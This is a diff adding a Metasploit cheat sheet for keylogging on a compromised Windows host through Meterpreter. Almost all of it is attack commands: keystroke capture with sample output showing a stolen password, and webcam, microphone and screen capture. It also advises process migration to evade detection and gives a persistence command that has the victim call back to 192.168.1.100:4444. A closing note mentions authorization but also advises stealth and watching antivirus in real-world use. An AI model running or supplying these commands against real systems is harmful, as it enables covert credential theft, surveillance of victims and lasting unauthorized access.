@@ -1,0 +1,50 @@
+METASPLOIT KEYLOGGER COMMANDS REFERENCE
+=====================================
+
+Once you have an active Meterpreter session, use these commands for keylogging:
+
+BASIC KEYLOGGER COMMANDS:
+------------------------
+keyscan_start       - Start capturing keystrokes
+keyscan_stop        - Stop capturing keystrokes  
+keyscan_dump        - Display captured keystrokes
+
+USAGE EXAMPLE:
+--------------
+meterpreter > keyscan_start
+Started keylogger on session 1
+
+meterpreter > keyscan_dump
+Dumping captured keystrokes...
+<Back><Back><Back><Back>password123<Return>
+
+meterpreter > keyscan_stop
+Stopped keylogger on session 1
+
+ADDITIONAL USEFUL COMMANDS:
+--------------------------
+sysinfo            - Get system information
+getuid             - Get current user ID
+ps                 - List running processes
+screenshot         - Take a screenshot
+webcam_snap        - Take webcam picture
+record_mic         - Record from microphone
+idletime           - Get idle time of user
+migrate <PID>      - Migrate to another process (helps avoid detection)
+
+POST-EXPLOITATION KEYLOGGER MODULE:
+----------------------------------
+To use the dedicated keylogger post-exploitation module:
+
+meterpreter > run post/windows/capture/keylog_recorder
+
+PERSISTENCE:
+-----------
+run persistence -X -i 5 -p 4444 -r 192.168.1.100
+
+NOTES:
+------
+- Always ensure you have proper authorization before using keyloggers
+- Test payloads should only be used in controlled lab environments  
+- Consider process migration for stealth operations
+- Monitor for antivirus detection with real-world usage
